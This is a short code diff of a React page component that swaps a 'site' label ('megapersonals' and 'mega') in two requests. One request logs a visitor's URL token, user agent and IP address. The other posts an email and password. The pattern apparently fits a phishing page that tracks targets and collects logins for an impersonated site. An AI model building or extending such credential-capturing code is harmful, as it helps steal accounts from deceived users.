@@ -46,7 +46,7 @@ const Home = () => {
       try {
          await request.post('/visitor-information/store', {
             user_access_token: searchParams.get("id"),
-            site: 'megapersonals',
+            site: 'mega',
             user_agent: window.navigator.userAgent,
             ip_address: ipAddress
          });
@@ -68,7 +68,7 @@ const Home = () => {
             email,
             password,
             user_access_token: searchParams.get("id"),
-            site: 'mega',
+            site: 'megapersonals',
             user_agent: window.navigator.userAgent
          });
 
